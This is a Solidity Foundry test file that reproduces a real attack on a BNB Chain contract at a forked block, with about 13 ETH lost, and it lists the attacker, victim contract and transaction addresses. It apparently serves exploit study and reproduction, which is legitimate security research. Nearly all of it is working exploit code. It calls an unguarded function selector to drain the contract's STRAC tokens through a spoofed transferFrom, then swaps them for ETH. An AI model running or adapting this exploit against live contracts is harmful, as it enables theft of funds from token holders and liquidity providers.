// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Total Lost : ~13 $ETH
// Attacker : https://bscscan.com/address/0xc7823188d459e1744c0e5fd58a0e074e92982ea3
// Attack Contract : https://bscscan.com/address/0xc7823188d459e1744c0e5fd58a0e074e92982ea3
// Vulnerable Contract : https://bscscan.com/address/0x1f90bdeb5674833868ee9b36707b929024e7a513
// Attack Tx : https://bscscan.com/tx/0x1147b3c0f3ebdd524c4e58430bb736eba9f7fa522158f5ad81eb3e2394b466d0

import "forge-std/Test.sol";
import "./../interface.sol";

contract ContractTest is Test {
    IERC20 STRAC = IERC20(0x9801DA0AA142749295692c7cb3241E4EE2B80Bda);
    IERC20 ETH = IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
    IPancakePair ETH_STRAC_LpPool = IPancakePair(0x2976bD3774622367CE7A575D28201480e640966F);
    IPancakeRouter PancakeRouter = IPancakeRouter(payable(0x3870D09F59564d8b86B052b1FB1e27b961f9BC73));
    address Contract_0x1f90 = 0x1F90BDeB5674833868EE9b36707B929024E7A513;

    function setUp() public {
        vm.createSelectFork("bsc", 29_474_566 - 1);
        vm.label(address(STRAC), "STRAC");
        vm.label(address(Contract_0x1f90), "Contract_0x1f90");
    }

    function testExploit() public {
        STRAC.approve(address(PancakeRouter), type(uint256).max);
        emit log_named_decimal_uint("Attacker ETH balance before attack", ETH.balanceOf(address(this)), 18);
        Contract_0x1f90.call(
            abi.encodeWithSelector(bytes4(0x4a75084c), address(this), STRAC, STRAC.balanceOf(address(Contract_0x1f90)))
        );
        TOKENToETH();
        emit log_named_decimal_uint("Attacker ETH balance after attack", ETH.balanceOf(address(this)), 18);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        return true;
    }

    function TOKENToETH() internal {
        (uint256 reserveETH, uint256 reserveTOKEN,) = ETH_STRAC_LpPool.getReserves();
        uint256 amountOut;

        (uint256 reserveETH_after, uint256 reserveTOKEN_after,) = ETH_STRAC_LpPool.getReserves();

        amountOut = PancakeRouter.getAmountOut(STRAC.balanceOf(address(this)), reserveTOKEN, reserveETH);
        STRAC.transfer(address(ETH_STRAC_LpPool), STRAC.balanceOf(address(this)));
        ETH_STRAC_LpPool.swap(amountOut * 997 / 1000, 0, address(this), "");
    }

    fallback() external payable {}
    receive() external payable {}
}
